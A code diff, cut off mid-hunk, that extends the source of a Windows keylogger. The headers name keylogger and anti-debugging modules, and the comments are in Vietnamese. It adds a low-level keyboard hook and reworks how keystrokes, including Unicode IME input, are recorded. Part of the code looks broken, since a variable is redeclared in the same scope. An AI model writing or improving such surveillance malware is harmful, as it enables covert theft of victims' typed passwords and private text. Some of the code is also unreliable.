@@ -1,12 +1,30 @@
-﻿#include "../keylogger.h"
-#include "../utils.h"
-#include "../antidebug.h"
-#include "../multilanguage.h"
+﻿#include "keylogger.h"
+#include "utils.h"
+#include "antidebug.h"
+#include "multilanguage.h"
 
 // Biến toàn cục
 bool capital = false, numLock = false, shift = false;
 DWORD tid = 0;
 HHOOK g_msgHook = NULL;  // Hook cho các thông báo
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION) {
+        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
+
+        // Phát hiện Alt+Shift (chuyển ngôn ngữ)
+        if ((kbStruct->vkCode == VK_SHIFT && (GetAsyncKeyState(VK_MENU) & 0x8000)) ||
+            (kbStruct->vkCode == VK_MENU && (GetAsyncKeyState(VK_SHIFT) & 0x8000))) {
+            // Cập nhật thông tin ngôn ngữ sau một khoảng thời gian ngắn
+            std::thread([] {
+                Sleep(100); // Đợi hệ thống cập nhật
+                UpdateImeStatus();
+                }).detach();
+        }
+    }
+
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
 
 LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
@@ -39,34 +57,36 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
             LanguageInfo langInfo = GetCurrentLanguageInfo();
 
             // Nếu đang sử dụng IME, để ImeHookProc xử lý
-            if (langInfo.isImeActive && IsImeLanguage(langInfo.keyboardLayout)) {
+         if (langInfo.isImeActive && IsImeLanguage(langInfo.keyboardLayout)) {
                 // Chỉ xử lý các phím đặc biệt, còn các ký tự sẽ do ImeHookProc xử lý
                 switch (keystroke->vkCode) {
-                case VK_BACK: { Write("[BACKSPACE]"); break; }
-                case VK_TAB: { Write("[TAB]"); break; }
-                case VK_RETURN: { Write("[ENTER]"); break; }
+                case VK_RETURN: { Write("\n"); break; }
+                case VK_SPACE: { Write(" "); break; } 
+                case VK_TAB: { Write("    "); break; }
                 case VK_MENU: { Write("[ALT]"); break; }
-                case VK_ESCAPE: { Write("[ESC]"); break; }
-                case VK_PRIOR: { Write("[PG UP]"); break; }
-                case VK_NEXT: { Write("[PG DN]"); break; }
-                case VK_END: { Write("[END]"); break; }
-                case VK_HOME: { Write("[HOME]"); break; }
-                case VK_LEFT: { Write("[LEFT]"); break; }
-                case VK_UP: { Write("[UP]"); break; }
-                case VK_RIGHT: { Write("[RIGHT]"); break; }
-                case VK_DOWN: { Write("[DOWN]"); break; }
                 case VK_PRINT: { Write("[PRINT]"); break; }
                 case VK_SNAPSHOT: { Write("[PRT SC]"); break; }
-                case VK_INSERT: { Write("[INSERT]"); break; }
-                case VK_DELETE: { Write("[DELETE]"); break; }
-                case VK_LWIN: { Write("[WIN KEY]"); break; }
-                case VK_RWIN: { Write("[WIN KEY]"); break; }
+                case VK_BACK: case VK_DELETE: case VK_LEFT: case VK_RIGHT:
+                case VK_UP: case VK_DOWN: case VK_ESCAPE: case VK_PRIOR:
+                case VK_NEXT: case VK_HOME: case VK_END: case VK_INSERT:
+                case VK_LWIN: case VK_RWIN: case VK_LCONTROL: case VK_RCONTROL:
+                case VK_LMENU: case VK_RMENU: case VK_LSHIFT: case VK_RSHIFT:
+                    break;
+
                 }
 
                 // Ghi lại các phím nhập liệu trực tiếp nếu không phải đang soạn thảo
                 if (!langInfo.isComposing) {
                     BYTE keyState[256] = { 0 };
-                    GetKeyboardState(keyState);
+                    if (GetKeyboardState(keyState)) {
+                        std::wstring unicodeChar = ExtractUnicodeCharFromKey(keystroke->vkCode, keyState);
+                        if (!unicodeChar.empty()) {
+                            WriteUnicode(unicodeChar);
+                        }
+                    }
+                    else {
+                        GetKeyboardState(keyState);
+                    }
 
                     std::wstring unicodeChar = ExtractUnicodeCharFromKey(keystroke->vkCode, keyState);
                     if (!unicodeChar.empty()) {
